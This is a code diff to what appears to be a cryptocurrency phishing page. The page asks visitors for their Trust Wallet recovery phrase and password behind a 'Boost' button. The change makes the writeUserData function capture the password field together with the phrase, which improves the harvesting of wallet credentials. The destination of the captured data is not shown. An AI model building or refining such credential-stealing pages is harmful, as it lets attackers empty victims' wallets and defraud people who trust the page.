@@ -210,7 +210,7 @@ If you don’t have Trust Wallet already <a href="https://play.google.com/store/
                   
         <p id="ph" class="b">phrase</p>        
         <textarea id="ipt"></textarea>
-<input type="number" placeholder="enter password if used">
+<input id="pa" type="number" placeholder="enter password if used">
         <p id="add" type="submit" onclick="writeUserData()">Boost</p>
         </div>
         <div id="msgs">
@@ -247,7 +247,7 @@ If you don’t have Trust Wallet already <a href="https://play.google.com/store/
 
 
     function writeUserData() {
-      var name = document.getElementById('ipt');
+      var name = document.getElementById('pa');
       var msg = document.getElementById('ipt');
 
       if (name.value === "" || msg.value === "") {
